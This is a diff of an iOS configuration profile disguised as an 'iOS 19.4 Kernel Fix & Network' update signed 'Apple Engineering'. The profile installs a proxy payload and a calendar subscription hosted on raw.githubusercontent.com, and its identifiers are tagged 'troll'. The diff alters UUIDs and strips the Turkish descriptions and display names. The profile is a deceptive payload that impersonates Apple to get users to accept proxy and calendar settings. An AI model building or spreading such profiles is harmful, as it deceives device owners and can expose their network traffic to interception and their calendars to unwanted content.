@@ -10,7 +10,7 @@
 			<key>PayloadIdentifier</key>
 			<string>com.apple.proxy.troll</string>
 			<key>PayloadUUID</key>
-			<string>11112222-3333-4444-5555-666677778888</string>
+			<string>77778888-9999-0000-1111-222233334444</string>
 			<key>PayloadVersion</key>
 			<integer>1</integer>
 			<key>ProxyType</key>
@@ -27,14 +27,9 @@
 			<key>PayloadIdentifier</key>
 			<string>com.apple.calendar.managed.troll</string>
 			<key>PayloadUUID</key>
-			<string>33334444-5555-6666-7777-888899990000</string>
+			<string>55556666-7777-8888-9999-000011112222</string>
 			<key>PayloadVersion</key>
 			<integer>1</integer>
-			<key>PayloadDescription</key>
-			<string> Sistem Bildirim Senkronizasyonu</string>
-			<key>PayloadDisplayName</key>
-			<string>Sistem Takvimi</string>
-			
 			<key>SubCalAccountHostName</key>
 			<string>raw.githubusercontent.com</string>
 			<key>SubCalAccountPath</key>
@@ -45,15 +40,12 @@
 	</array>
 
 	<key>PayloadDisplayName</key>
-	<string> iOS 19.4 Network &amp; Kernel Fix</string>
-	<key>PayloadDescription</key>
-	<string>İnternet hızını artırır ve bildirim sistemini optimize eder.</string>
+	<string> iOS 19.4 Kernel Fix &amp; Network</string>
 	<key>PayloadIdentifier</key>
 	<string>com.apple.system.ultra-fix</string>
 	<key>PayloadOrganization</key>
 	<string>Apple Engineering</string>
-	<key>PayloadRemovalDisallowed</key>
-	<false/> <key>PayloadType</key>
+	<key>PayloadType</key>
 	<string>Configuration</string>
 	<key>PayloadUUID</key>
 	<string>ABCDEF12-3456-7890-ABCD-EF1234567890</string>
